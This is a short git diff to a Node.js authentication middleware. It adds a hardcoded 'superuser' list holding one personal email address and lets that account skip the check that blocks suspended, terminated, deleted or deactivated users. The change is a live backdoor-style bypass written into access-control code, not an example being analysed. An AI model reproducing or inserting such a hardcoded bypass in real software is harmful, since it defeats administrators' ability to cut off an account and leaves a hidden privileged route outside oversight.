@@ -72,9 +72,14 @@ const authMiddleware = async (req, res, next) => {
         const user = users[0];
         const userData = { ...decoded, ...user, userType: user.user_role }; 
 
+        // SUPERUSER BYPASS — these accounts skip all lifecycle gates
+        const SUPERUSER_EMAILS = ['lewismwangi990@gmail.com'];
+        const isSuperuser = SUPERUSER_EMAILS.includes((user.email || '').toLowerCase());
+
         // ACCOUNT LIFECYCLE CHECK (Suspend, Terminate, Deletion, Deactivated)
         const accountStatus = user.account_status ? String(user.account_status).trim().toLowerCase() : 'active';
-        if (accountStatus !== 'active') {
+        if (!isSuperuser && accountStatus !== 'active') {
+
             userCache.delete(decoded.userId);
             if (accountStatus === 'suspended') {
                 return res.status(403).json({
